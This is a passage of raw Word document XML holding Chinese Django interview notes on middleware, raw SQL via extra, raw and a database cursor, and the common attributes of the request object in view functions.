      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件生命周期？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0F40C7" w14:textId="77777777" w:rsidR="006B2B80" w:rsidRDefault="006B2B80" w:rsidP="00AD41B7">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6A0D0B18" wp14:editId="5647F35C">
            <wp:extent cx="7559765" cy="3064933"/>
            <wp:effectExtent l="0" t="0" r="3175"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620132" cy="3089407"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="373514F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请求过来：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A723F8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中间件：拦截一部分请求；比如验证</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">session, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>没有登录的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求一些页面，跳转至登录页；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>图片为中间件的请求过程</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>.)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>再到 urls ，分发请求到views 视图 ，通过 CBV(dispatch反射) 和 FBV 的 get 请求 讲 template 页面渲染返回给用户；渲染之前 可以从数据库拿出数据，放到render 的参数里面传递过去， locals() 表示 把所有参数传递还可以 实例化 其他 form 类，并渲染给前端</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFC7BFB" w14:textId="1B575F96" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="00AD41B7"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2" w:name="t9"/>
      <w:bookmarkEnd w:id="2"/>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>021</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django</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中怎么写原生</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002D26C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列举</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django orm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中三种能写</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>语句的方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F35448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使用extra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：查询人民邮电出版社出版并且价格大于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>元的书籍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1993F87F"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Book.objects.filter(publisher__name='</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>人民邮电出版社</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>').extra(where=['price&gt;50']) </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB0DA21"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使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>raw</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AD1476"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books=Book.objects.raw('select * from hello_book')  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F698A2"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for book in books:  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304A474F"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   print book  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9E6DFA"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自定义</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EDE636"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from django.db import connection  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45A59004"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  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B92C097"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cursor = connection.cursor()  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47F36A93"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cursor.execute("insert into hello_author(name) VALUES ('</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>郭敬明</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>')")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604C5DD8"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cursor.execute("update hello_author set name='</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>韩寒</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>' WHERE name='</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>郭敬明</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CB91C81"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lastRenderedPageBreak/>
        <w:t>cursor.execute("delete from hello_author where name='</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>韩寒</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>'")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1487766E"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cursor.execute("select * from hello_author")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD70D4A"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cursor.fetchone()  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7425939D"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color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cursor.fetchall() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F527872" w14:textId="29119DCA" w:rsidR="006B2B80" w:rsidRPr="008E43D1" w:rsidRDefault="002437D1" w:rsidP="008E43D1">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3" w:name="t10"/>
      <w:bookmarkStart w:id="4" w:name="t12"/>
      <w:bookmarkEnd w:id="3"/>
      <w:bookmarkEnd w:id="4"/>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>023</w:t>
      </w:r>
      <w:r w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="006B2B80" w:rsidRPr="008E43D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>视图函数中，接收的请求对象常用方法和属性有哪些？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E37A9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path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>属性，获取请求页面的全路径，不包括域名</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E2D02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method</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>属性，获取请求中使用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式的字符串表示。全大写表示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7657D46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GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>属性，获取</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方式请求传参，的参数（字典类型）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227BB59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如：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:eastAsia="微软雅黑" w:hAnsi="Arial" w:cs="Arial" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>http://127.0.0.1:8000/bug/articles/?mch=123 &amp; mim=456</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF2B47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复制代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40029CDD"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from django.shortcuts import render,HttpResponse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F489D88"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def special(request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD03CAD"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print(request.GET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52B4A39F"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return render(request,'index.html') #</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>向用户显示一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>html</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>页面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76F5DE61"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w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>返回：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5161245A"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#&lt;QueryDict: {' mim': ['456'], 'mch': ['123 ']}&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16BC66F1"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POST</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w: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包含所有</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>HTTP POST</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>参数的类字典对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C5E1A6"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466E7CB0"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服务器收到空的</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>请求的情况也是可能发生的，也就是说，表单</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B24E8C"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HTTP POST</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法提交请求，但是表单中可能没有数据，因此不能使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E7C05D6"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if req.POST</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>来判断是否使用了</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP POST </w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法；应该使用</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> if req.method=="POST"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F8A653"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xml:space="preserve">COOKIES: </w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>包含所有</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>cookies</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的标准</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>字典对象；</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>keys</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>values</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都是字符串。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C11B835"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED4C555"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FILES</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>：</w:t>
      </w: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包含所有上传文件的类字典对象；</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>FILES</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的每一个</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Key</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>都是</w:t>
      </w:r>
      <w:r w:rsidRPr="002437D1">
